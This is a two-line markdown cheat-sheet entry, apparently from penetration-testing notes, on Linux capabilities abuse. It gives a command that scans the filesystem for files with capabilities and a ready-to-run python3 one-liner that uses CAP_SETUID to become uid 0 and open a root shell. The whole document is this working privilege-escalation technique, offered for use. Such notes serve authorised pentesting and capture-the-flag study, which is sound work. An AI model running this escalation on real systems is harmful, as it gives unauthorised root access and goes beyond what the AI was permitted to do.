# Capabilities Abuse
- `getcap -r / 2>/dev/null`
- `CAP_SETUID`: `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'`